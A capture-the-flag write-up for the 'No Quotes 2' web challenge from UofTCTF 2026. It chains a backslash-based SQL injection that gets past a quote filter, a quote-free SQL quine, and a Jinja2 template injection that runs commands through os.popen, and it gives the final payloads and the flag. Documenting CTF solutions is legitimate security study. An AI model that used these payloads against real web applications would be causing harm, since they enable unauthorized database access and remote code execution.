# Web - NoQuotes2

---
Category: Web
Challenge Name: No Quotes 2

## The Vulnerabilities

### 1. SQL Injection (with WAF bypass)
```python
# WAF blocks ' and "
def waf(value): return any(c in value for c in ["'", '"'])

# But the query uses f-string formatting
query = f"SELECT ... WHERE username = ('{username}') AND password = ('{password}')"
```

**Bypass:** Use `\` to escape the closing quote:
- Username: `payload\`  
- This makes MySQL read: `username = ('payload\') AND password = ('...`
- The `\` escapes the `'`, so everything until the next `'` becomes part of the string

### 2. Quine Check
```python
if not username == row[0] or not password == row[1]:
    return "Invalid credentials"
```
The app checks that your **input** matches the **database result**. So your password payload must return **itself** — a SQL Quine!

### 3. SSTI
```python
return render_template_string(template % session["user"])
```
The username gets rendered as a Jinja2 template → RCE if we control it.

## The Exploit

### Step 1: SQL Quine (no quotes allowed)
Classic quine pattern using `REPLACE`:
```sql
REPLACE($, CHAR(36), CONCAT(0x3078, HEX($)))
```
- `CHAR(36)` = `$` (placeholder, no quotes needed)
- `0x3078` = `"0x"` in hex (no quotes needed)
- Hex strings (`0x...`) work without quotes in MySQL

### Step 2: SSTI Payload
```jinja2
{{ url_for.__globals__.os.popen(request.args.cmd).read() }}
```
Command passed via URL param `?cmd=/readflag` to avoid quotes.

### Step 3: Final Payload
```
Username: {{ url_for.__globals__.os.popen(request.args.cmd).read() }}\
Password: ) UNION SELECT 0x<hex_username>, REPLACE(0x<hex_T>, CHAR(36), CONCAT(0x3078, HEX(0x<hex_T>))) #
```

## Flag
```
uoftctf{d1d_y0u_wR173_4_pr0P3r_qU1n3_0r_u53_INFORMATION_SCHEMA???}
```
---

## Attachments

- [exploit.py](https://raw.githubusercontent.com/rehackxyz/REUN10N/main/CTF-writeups/2026/uoftctf-2026/assets/noquotes2-exploit.py)


Solved by: jerit3787